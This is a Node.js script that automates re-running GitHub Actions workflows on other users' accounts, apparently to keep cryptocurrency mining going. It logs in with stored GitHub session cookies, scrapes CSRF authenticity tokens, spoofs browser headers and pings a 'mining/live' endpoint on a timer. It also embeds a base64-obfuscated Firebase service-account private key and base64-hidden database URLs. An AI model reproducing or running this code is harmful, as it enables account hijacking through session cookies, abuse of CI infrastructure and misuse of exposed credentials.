const admin = require('firebase-admin')
const express = require('express')
const axios = require('axios')


let mUrl = null

let mStart = parseInt(new Date().getTime()/1000)
let mTime = new Date().toString()

const serviceAccount = JSON.parse(decode('eyJ0eXBlIjoic2VydmljZV9hY2NvdW50IiwicHJvamVjdF9pZCI6ImpvYi1zZXJ2ZXItMDg4IiwicHJpdmF0ZV9rZXlfaWQiOiIzZWU1MjAxMDk5YTRmNTI4YjYzYWNkYjc0OTk1ZDUzYjExZDdhNTkzIiwicHJpdmF0ZV9rZXkiOiItLS0tLUJFR0lOIFBSSVZBVEUgS0VZLS0tLS1cbk1JSUV2QUlCQURBTkJna3Foa2lHOXcwQkFRRUZBQVNDQktZd2dnU2lBZ0VBQW9JQkFRQ05JbjRrQ2MxVmhwSW1cblRiRStiOWFJbjNPVDNmN1Jhd05IMmJ6WXZIVG5ERkdFTGN5Zm91MUdkRHBlSkRBeHpEaGxuRUVBNXphUmN3Q2Rcbjc2ZGwxbFMvRUMwSGRuVEJCY0ZmZDFwWkJCMG9UVlpuZ2gwajFwM3ZQeFdPSW9xZGNMS0w4c3pLUlJkOEdudFBcbkh5SUxjOHdTRFJoazQyS1JJck9qNzdEZlo3T0RuZ0k3VFlZWEdHWkdlZC9LbDgrWHhZbVVvY3FpNGNad05WRldcbkdLSmd5NUxTVUFHQlllb09EYTAxS3Zhb1ozaElxVEV5UzFMc2VFNENUa3drRjBaaFhyZkczdlc5ZGZQNkVhTURcbkl0eUk0bXZ6T24zaHJ6NWJjQmcybkZRRTZjcUpDaGRmbFhKaG81ODBLdlRid25EcWxhT2l0ZlRrNHJUMUVxcE9cbjR2MHV6dkp0QWdNQkFBRUNnZ0VBUlo4NTNicE9KajRqMDZ4bzNyV1ovYnkyN2I5SjZISGpaT3JuQzMzd0oxZytcbjBEY3RwYVJnYTJ5RHJKUXFpQzVIdGV4ZWJyMGdnS0RjTVkwYkpaUVZLMG1tQlBQdEJaazZ1c2JzZFZRZnRCVnVcbnBkSWNZT1VLOVE1SUtsMGt4eVRrbDBBWHdVSlRJd0FIUzFFKzRLcG5oWkliTWcydnZvd0JWVUkxSFFnUm1MKzZcbmtoVFM1ZTUzYnJwZFlFOU04QmhISDVsbTV3OVB2bTJLa1QyejBlV1lXaDJBUUQ5MVBuQTExK2Y3ek96N1FHMFdcbmdxMU5qSjh3TUt3SE5vL0svNEhJQWZSRThDNkROUDJ4UWNkNWdXaXpOSWxnWTF5a2x4RzFRVEo1K3lORDVvVHRcbndKV3RNS1luQkE4cVZSN1R6NVNUVWk1bzlZY3ZML1NsaFozNEJnbWttd0tCZ1FERXBHbGswQ1ZUVFVWVXJEL0FcbjRrR2lGZmI1cEsrODlNL245TnJFWk5zdVEyUzFGQVNIWmtJdFpBN2VIdDY3d3FOWmpJU0RFekk5alZZSnc1akRcbnluMTJhSWNpWHVwQ0RTV3JFNTJOVlZURHE5WGs3WWRDSlZ4Y1pBbmY4ZlVFdEZ1SVpBZ01wVHY0MHMwNXZlSW9cbjEyV1BTRDhGY2ZoTHdvVlVuYnRYVC84Unh3S0JnUUMzdkxqeFhsQmk2YXU3T01sS0gwSzd6RGR1dFpMU2NGb0JcblVDclZxVG8xOGM5ZkJaRmh6Uk5PUHc4YW5kYTdYVHh2elg5Q1JXa0txR0h6cjd6NGNnZDBNd0hQNjlUT25USUxcbmdaOWIzekUrZG1xR2FTZThkRHdUWUxUcHhPejNBWk96Ym1Qek1sNFVRMkNpUnphUzFIZHdBZkF6bVlKV08weWlcbkZWUFY5NUZhS3dLQmdCamhSSVNBNFhnY3VyenYzbEVsVDNDV250MFBQVDBITEpjSW4vVmhYV29KRk9Ea1czNVdcbkxlRllXNWszQnE5eS9RQURpM0NhS1Mwb2lNNUxkVFN3bGhjNU9uL2F5b0Q0OE44b2FETE5yUi9reWZkaEprLzBcbk1pOXVhT0Z3MTdOMHJuQWZWL1Zob3FqazR4cC9ML0pDN3BLbWJYTGU3SytKT1IxdnA1aHdnckZaQW9HQWNEdDNcblBQaS9ZYXdhbW1JMWtuRkY4akRzSzFQK08wMGxyV2Vxd3BoOFZqYysxR3d5UWV0aXY0a0ZVTnpaTGRubDhPVTFcbnR1VnZKSE4yWWNRWFNpdGRJajJGL2R1d1FnVURiTVBnODkyQjF3VytUQnd2aVkzMnBGK09JcjJIZ2RvVXZxWFBcbnA5NDhXV1JPd3RGOUpITmtBYWN0Y2xkeXBmblM5YTdSWndHeVo4RUNnWUFiQkQwZDgzRGVsaFV5VDRjOW91TUZcbkU5WUV2YzdXVVlvbHkreXVzVW82Z0tLSE81QjhWdWJ0d0JGaWJoUW1QREJRSFJaVUhiYk1JZXRsb2ZUazE5MW9cbklBMS9Ka2tkV0RrR1FvSWYvTE5sdDV2M0ZILzluZ3hma2dzdE9BSXNVNzRlVkg0RmgvQkRlUm5UckxWN01QQy9cblFBSmxMY2txYll5Y0Myb29HYVRDT2c9PVxuLS0tLS1FTkQgUFJJVkFURSBLRVktLS0tLVxuIiwiY2xpZW50X2VtYWlsIjoiZmlyZWJhc2UtYWRtaW5zZGstNmMxdnpAam9iLXNlcnZlci0wODguaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLCJjbGllbnRfaWQiOiIxMTU3MDQ4NTUwMTIxNTg2NzE2ODEiLCJhdXRoX3VyaSI6Imh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9vL29hdXRoMi9hdXRoIiwidG9rZW5fdXJpIjoiaHR0cHM6Ly9vYXV0aDIuZ29vZ2xlYXBpcy5jb20vdG9rZW4iLCJhdXRoX3Byb3ZpZGVyX3g1MDlfY2VydF91cmwiOiJodHRwczovL3d3dy5nb29nbGVhcGlzLmNvbS9vYXV0aDIvdjEvY2VydHMiLCJjbGllbnRfeDUwOV9jZXJ0X3VybCI6Imh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3JvYm90L3YxL21ldGFkYXRhL3g1MDkvZmlyZWJhc2UtYWRtaW5zZGstNmMxdnolNDBqb2Itc2VydmVyLTA4OC5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIsInVuaXZlcnNlX2RvbWFpbiI6Imdvb2dsZWFwaXMuY29tIn0='))

let BASE_URL = decode('aHR0cHM6Ly9qb2Itc2VydmVyLTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vcmFpeWFuMDg4Lw==')
let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9qb2Itc2VydmVyLTA4OC5hcHBzcG90LmNvbS9vLw==')


admin.initializeApp({
    credential: admin.credential.cert(serviceAccount),
    storageBucket: 'gs://job-server-088.appspot.com'
})

let app = express()

app.use(express.json())

app.listen(process.env.PORT || 3010, ()=>{
    console.log('Listening on port 3000')
})

app.get('/', async (req, res) => {
    res.end(''+mStart)
})

app.get('/start', async (req, res) => {
    res.end(''+mTime)
})

const storage = admin.storage().bucket()


startServer()
updateServer()


setInterval(async () => {
    await startServer()
}, 300000)

setInterval(async () => {
    await updateServer()
}, 300000)

async function startServer() {
    if (mUrl == null) {
        try {
            let response = await axios.get(BASE_URL+'mining/live/server_2.json')

            let data = response.data
            if (data != null && data != 'null') {
                mUrl = data
            }
        } catch (error) {}
    }

    if (mUrl) {
        try {
            await axios.get('https://'+mUrl)
        } catch (error) {}
    }
}

async function updateServer() {
    try {
        const results = await storage.getFiles({ prefix: 'server' })
        const files = results[0]
        let now = parseInt(new Date().getTime()/1000)
        let list = []

        files.forEach(file => {
            try {
                let time = parseInt(file.metadata['contentType'].replace('active/', ''))
                if(now-time > 180) {
                    let name = file.metadata.name.replace('server/', '').replace('.json', '')
                    list.push(name)
                }
            } catch (error) {}
        })

        console.log('All:', files.length-1, 'Update:', list.length)
        
        if (list.length > 0) {
            let devide = 180000/list.length

            for (let i = 0; i < 1; i++) {
                updateWebsite(i+1, list[i], i*devide)
            }
        }
    } catch (error) {}
}
   
async function updateWebsite(id, user, timeout) {
    setTimeout(async() => {
        try {
            let response = await axios.get(BASE_URL+'github/server/'+user+'.json')

            let data = response.data
            
            let cookies = 'user_session='+data['cookies']+'; __Host-user_session_same_site='+data['cookies']+'; has_recent_activity=1; logged_in=yes; preferred_color_mode=dark; '
            
            await activeAction(id, user, data['action'], cookies)
        } catch (error) {}
    }, timeout)
}

async function activeAction(id, user, action, cookies) {
    let token = null

    try {
        let response = await axios.get('https://github.com/'+user+'/'+user+'/actions/runs/'+action, { 
            headers: getFrameHeader(cookies),
            maxRedirects: 0,
            validateStatus: null
        })

        let body = response.data

        if (body.includes('Failure') || body.includes('Cancelled') || body.includes('Success')) {
            if (body.includes('rerequest_check_suite') && body.includes('id="rerun-dialog-mobile-all"')) {
                body = body.substring(body.indexOf('id="rerun-dialog-mobile-all"'), body.length)
                body = body.substring(0, body.indexOf('</dialog>'))
                body = body.substring(body.indexOf('rerequest_check_suite'), body.length)
                
                let name = 'name="authenticity_token"'
                if (body.includes(name)) {
                    let index = body.indexOf(name)+name.length
                    let _token = body.substring(index, index+200).split('"')[1]
                    if (_token && _token.length > 10) {
                        token = _token
                    }
                }
            }
        }
    } catch (error) {}

    if (token) {
        let response = await axios.post('https://github.com/'+user+'/'+user+'/actions/runs/'+action+'/rerequest_check_suite',
            new URLSearchParams({
                '_method': 'put',
                'authenticity_token': token
            }),
        {
            headers: getGrapHeader(cookies),
            maxRedirects: 0,
            validateStatus: null,
        })

        try {
            if (response.data.length > 0) {
                console.log(id, 'Block: '+user)
            } else {
                console.log(id, 'Success: '+user)
            }

            await axios.post(STORAGE+encodeURIComponent('server/'+user+'.json'), '', {
                headers: {
                    'Content-Type':'active/'+(parseInt(new Date().getTime()/1000)+100)
                },
                maxBodyLength: Infinity,
                maxContentLength: Infinity
            })
        } catch (error) {
            console.log(id, 'Error: '+user)
        }
    } else {
        console.log(id, 'Already Active: '+user)
    }
}

async function getToken(user, repo, action, cookies) {
    

    return null
}

function getFrameHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html, application/xhtml+xml',
        'accept-language': 'en-US,en;q=0.9',
        'cookie': cookies,
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'turbo-frame': 'repo-content-turbo-frame',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function getGrapHeader(cookies) {
    return {
        'authority': 'github.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookies,
        'origin': 'https://github.com',
        'sec-ch-ua': '"Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'
    }
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('ascii')
}
